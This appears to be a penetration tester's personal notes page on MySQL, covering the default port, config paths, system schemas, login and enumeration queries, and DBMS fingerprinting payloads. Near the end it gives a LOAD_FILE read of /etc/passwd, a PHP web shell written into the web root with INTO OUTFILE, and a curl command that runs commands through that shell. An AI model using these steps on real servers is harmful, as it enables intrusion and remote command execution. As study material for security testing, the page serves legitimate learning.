+++
title = "MySQL"
+++

- `TCP 3306`: normal
- Server Config:
    - `/etc/mysql/mysql.conf.d/mysqld.cnf`
- default system schemas/databases:
    - `mysql` - is the system database that contains tables that store information required by the MySQL server
    - `information_schema` - provides access to database metadata
    - `performance_schema` - is a feature for monitoring MySQL Server execution at a low level
    - `sys` - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema
- `secure_file_priv` may be set as follows:
    - If empty, the variable has no effect, which is not a secure setting.
    - If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
    - If set to NULL, the server disables import and export operations
- System Schema: https://dev.mysql.com/doc/refman/8.0/en/system-schema.html#:~:text=The%20mysql%20schema%20is%20the,used%20for%20other%20operational%20purposes
- Logical Operators: https://mariadb.com/docs/server/reference/sql-structure/operators/operator-precedence
- Cheatsheet: https://devhints.io/mysql

Database > Schema > Table > Column > Value

{{% details "Dangerous Settings" %}}
- https://dev.mysql.com/doc/refman/8.0/en/server-system-variables.html

| **Settings**       | **Description**                                                                                              |
| ------------------ | ------------------------------------------------------------------------------------------------------------ |
| `user`             | Sets which user the MySQL service will run as.                                                               |
| `password`         | Sets the password for the MySQL user.                                                                        |
| `admin_address`    | The IP address on which to listen for TCP/IP connections on the administrative network interface.            |
| `debug`            | This variable indicates the current debugging settings                                                       |
| `sql_warnings`     | This variable controls whether single-row INSERT statements produce an information string if warnings occur. |
| `secure_file_priv` | This variable is used to limit the effect of data import and export operations.                              |
{{% /details %}}

```bash
# Login
# - try "root"
mysql -u <USER> -h <TARGET>
mysql -u <USER> --password=<PASSWORD> -P <PORT> -h <TARGET>
```

`sqlmap`'s query data has a lot of good example commands for enumeration:
- https://github.com/sqlmapproject/sqlmap/blob/master/data/xml/queries.xml

```sql
-- Show Version
SELECT @@version ;
SELECT version() ;

-- Show User
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user

SHOW databases ;
SHOW grants ;

-- Show if user is privileged
SELECT super_priv FROM mysql.user
SELECT super_priv FROM mysql.user WHERE user="root"

-- Show user permissions
SELECT grantee,privilege_type FROM information_schema.user_privileges
SELECT grantee,privilege_type FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"
-- look for interesting perms like "FILE" to read/write files

-- Tables and metadata
USE sys ;
SELECT host,unique_users FROM sys.host_summary ;

USE <DATABASE> ;
SHOW tables ;
DESCRIBE <TABLE> ;

-- Write data
INSERT INTO <TABLE> VALUES (<COL1_VAL>, <COL2_VAL>, <COL3_VAL>, ...);

-- Get data
SELECT * FROM <TABLE> WHERE <COLUMN> = "<VALUE>" ;
# WHERE x LIKE "%blah%" ;
SELECT * FROM <TABLE> WHERE <COLUMN> LIKE "%<VALUE>%" ORDER BY <COLUMN> ASC|DESC LIMIT <NUM> ;

-- Example COUNT
SELECT COUNT(*) FROM <TABLE> WHERE <COLUMN1> > 10000 OR <COLUMN2> NOT LIKE '%<KEYWORD>%' ;
```

## Enumeration

### MySQL

These commands are specific though not necessarily exclusive to MySQL

| Payload            | When to Use                      | Expected Output                                     | Wrong Output                                              |
| ------------------ | -------------------------------- | --------------------------------------------------- | --------------------------------------------------------- |
| `SELECT @@version` | When we have full query output   | MySQL Version 'i.e. `10.3.22-MariaDB-1ubuntu1`'     | In MSSQL it returns MSSQL version. Error with other DBMS. |
| `SELECT POW(1,1)`  | When we only have numeric output | `1`                                                 | Error with other DBMS                                     |
| `SELECT SLEEP(5)`  | Blind/No Output                  | Delays page response for 5 seconds and returns `0`. | Will not delay response with other DBMS                   |

- https://dev.mysql.com/doc/refman/8.0/en/information-schema-introduction.html
- https://dev.mysql.com/doc/refman/8.0/en/information-schema-schemata-table.html
- Default (built-in) databases:
    - `information_schema`
    - `performance_data`
    - `mysql`

```bash
# Show currently used database (if inside a query)
SHOW database()

USE information_schema ;  # metadata

# Get database names
SELECT schema_name FROM information_schema.schemata ;

# Show tables
SELECT table_name,table_schema FROM information_schema.tables where table_schema='<DATABASE>' ;

# Get columns
select COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='<TABLE>' ;

# Finally read values
SELECT <COLUMN> FROM <DATABASE>.<TABLE> ;
```

### Read Files

```sql
-- Read Files
SELECT LOAD_FILE("/etc/passwd") ;
```

### Write Files

1. User with `FILE` privilege enabled
2. MySQL global [`secure_file_priv` variable](https://mariadb.com/docs/server/server-management/variables-and-modes/server-system-variables#secure_file_priv) not enabled
3. Write access to the location we want to write to on the back-end server

```sql
-- Write Files
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
-- For 4 columns
SELECT "","<?php system($_REQUEST[0]); ?>","","" INTO OUTFILE '/var/www/html/webshell.php';
```

```bash
curl -o- 'http://<TARGET>/webshell.php?0=<COMMAND>'
```
